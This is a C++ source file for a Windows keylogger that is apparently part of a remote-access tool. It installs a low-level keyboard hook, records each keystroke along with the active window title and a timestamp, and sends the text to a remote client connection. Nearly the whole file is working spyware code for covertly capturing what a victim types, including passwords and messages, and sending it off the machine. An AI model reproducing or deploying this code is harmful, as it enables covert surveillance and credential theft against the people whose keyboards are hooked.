#include "pch.h"
#include <time.h>

#include "runtime/utils.h"
#include "keylog.h"
#include "connection/client.h"

HHOOK _hook;

KBDLLHOOKSTRUCT kbdStruct;

// static std::ostream * outStream;
client* cli;

static LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		// valid action: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			LogKeyStoke(cli ,kbdStruct.vkCode);
		}
	}

	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

static void KeyLoggerInit(client * cli)
{
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		ErrorExit(L"Failed to install hook!");
	}

	// outStream.open("KeyLog.txt", std::ios_base::app);
	//outStream = new std::ostream(std::cout.rdbuf());
	::cli = cli;
}

static void KeyLoggerFini()
{
	UnhookWindowsHookEx(_hook);
	// outStream = NULL;
}

void LogKeyStoke(client* cli, DWORD key_stroke)
{
	//std::cout << key_stroke << '\n';

	static char lastwindow[256] = "";

	if ((key_stroke == 1) || (key_stroke == 2))
		return; // ignore mouse clicks
	
	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = NULL;
	if (foreground) {
		//get keyboard layout of the thread
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);
	}
	string result;
	if (foreground)
	{
		char window_title[256];
		GetWindowTextA(foreground, (LPSTR)window_title, 256);

		if (strcmp(window_title, lastwindow) != 0) {
			strcpy(lastwindow, window_title);

			// get time
			time_t t = time(NULL);
			struct tm* tm = localtime(&t);
			char s[64];
			strftime(s, sizeof(s), "%c", tm);

			result = "\n\n[当前窗口: " + string(window_title) + " - at " + s + "] \n";
		}
	}

	if (key_stroke == VK_BACK)
		result += "[BACKSPACE]";
	else if (key_stroke == VK_RETURN)
		result += "\n";
	else if (key_stroke == VK_SPACE)
		result += " ";
	else if (key_stroke == VK_TAB)
		result += "[TAB]";
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
		result += "[SHIFT]";
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
		result += "[CONTROL]";
	else if (key_stroke == VK_ESCAPE)
		result += "[ESCAPE]";
	else if (key_stroke == VK_END)
		result += "[END]";
	else if (key_stroke == VK_HOME)
		result += "[HOME]";
	else if (key_stroke == VK_LEFT)
		result += "[LEFT]";
	else if (key_stroke == VK_UP)
		result += "[UP]";
	else if (key_stroke == VK_RIGHT)
		result += "[RIGHT]";
	else if (key_stroke == VK_DOWN)
		result += "[DOWN]";
	else if (key_stroke == 190 || key_stroke == 110)
		result += ".";
	else if (key_stroke == 189 || key_stroke == 109)
		result += "-";
	else if (key_stroke == 20)
		result += "[CAPSLOCK]";
	else {
		char key;
		// check caps lock
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		// check shift key
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
			lowercase = !lowercase;
		}

		//map virtual key according to keyboard layout 
		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

		//tolower converts it to lowercase properly
		if (!lowercase) key = tolower(key);
		result += char(key);
		// *out << char(key);
	}
	cli->sendRaw(result);
	//instead of opening and closing file handlers every time, keep file open and flush.
	// (*out).flush();
	return;
}

KeyLoggerInterface HookKeyLogger = {
	.KeyLoggerInit = KeyLoggerInit,
	.KeyLoggerFini = KeyLoggerFini
};